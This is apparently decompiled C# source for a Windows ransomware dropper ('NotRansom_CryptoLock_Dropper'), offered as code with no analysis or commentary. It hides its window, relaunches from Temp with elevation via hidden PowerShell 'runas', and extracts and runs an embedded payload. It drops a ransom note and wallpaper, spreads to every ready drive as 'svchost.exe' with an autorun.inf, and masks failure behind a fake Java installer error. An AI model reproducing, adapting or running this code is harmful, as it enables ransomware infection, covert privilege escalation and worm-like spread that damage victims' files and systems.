using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Windows.Forms;

namespace NotRansom_CryptoLock_Dropper;

public class Form1 : Form
{
	[Flags]
	internal enum MoveFileFlags
	{
		None = 0,
		ReplaceExisting = 1,
		CopyAllowed = 2,
		DelayUntilReboot = 4,
		WriteThrough = 8,
		CreateHardlink = 0x10,
		FailIfNotTrackable = 0x20
	}

	internal static class NativeMethods
	{
		[DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
		public static extern bool MoveFileEx(string lpExistingFileName, string lpNewFileName, MoveFileFlags dwFlags);
	}

	private IContainer components;

	public Form1()
	{
		InitializeComponent();
	}

	public static void Extract(string nameSpace, string outDirectory, string internalFilePath, string resourceName)
	{
		using Stream stream = Assembly.GetCallingAssembly().GetManifestResourceStream(nameSpace + "." + ((internalFilePath == "") ? "" : (internalFilePath + ".")) + resourceName);
		using BinaryReader binaryReader = new BinaryReader(stream);
		using FileStream output = new FileStream(outDirectory + "\\" + resourceName, FileMode.OpenOrCreate);
		using BinaryWriter binaryWriter = new BinaryWriter(output);
		binaryWriter.Write(binaryReader.ReadBytes((int)stream.Length));
	}

	private void worm()
	{
		try
		{
			string text = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
			for (int i = 0; i < text.Length; i++)
			{
				if (new DriveInfo(text[i].ToString()).IsReady)
				{
					File.Copy(Assembly.GetExecutingAssembly().Location, Path.Combine(text[i] + ":\\", "svchost.exe"), overwrite: true);
					Extract("NotRansom_CryptoLock_Dropper", Path.Combine(text[i] + ":\\"), "Resources", "autorun.inf");
				}
			}
		}
		catch (Exception)
		{
		}
	}

	private bool IsAdministrator()
	{
		return new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
	}

	private static string RansomString(int length)
	{
		using RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		byte[] array = new byte[(length * 6 + 7) / 8];
		rNGCryptoServiceProvider.GetBytes(array);
		return Convert.ToBase64String(array);
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		//IL_017f: Unknown result type (might be due to invalid IL or missing references)
		string tempPath = Path.GetTempPath();
		string text = Path.Combine(tempPath, RansomString(10) + ".exe");
		if (!Directory.GetCurrentDirectory().Contains("Temp"))
		{
			File.Copy(Assembly.GetExecutingAssembly().Location, text, overwrite: true);
			Process process = new Process();
			process.StartInfo.FileName = "powershell.exe";
			process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process.StartInfo.Arguments = "start-process " + text + " -verb runas";
			process.Start();
			Environment.Exit(0);
		}
		try
		{
			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
			Path.Combine(tempPath, "WallPaper.jpg");
			Extract("NotRansom_CryptoLock_Dropper", ".", "Resources", "d.nrcl");
			Extract("NotRansom_CryptoLock_Dropper", ".", "Resources", "e.nrcl");
			Extract("NotRansom_CryptoLock_Dropper", ".", "Resources", "n.nrcl");
			Extract("NotRansom_CryptoLock_Dropper", ".", "Resources", "w.nrcl");
			File.Copy(Path.Combine(".", "e.nrcl"), Path.Combine(tempPath, text), overwrite: true);
			File.Copy(Path.Combine(".", "w.nrcl"), Path.Combine(tempPath, "WallPaper.jpg"), overwrite: true);
			File.Copy(Path.Combine(".", "n.nrcl"), Path.Combine(folderPath, "note.txt"), overwrite: true);
			Process.Start(Path.Combine(tempPath, text));
			worm();
		}
		catch (Exception)
		{
			MessageBox.Show("JavaInstaller Failed...", "Java", (MessageBoxButtons)0, (MessageBoxIcon)16);
		}
		Environment.Exit(0);
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		((Control)this).SuspendLayout();
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 12f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(0, 0));
		((Form)this).set_ControlBox(false);
		((Control)this).set_Cursor(Cursors.get_Arrow());
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_WindowState((FormWindowState)1);
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
	}
}
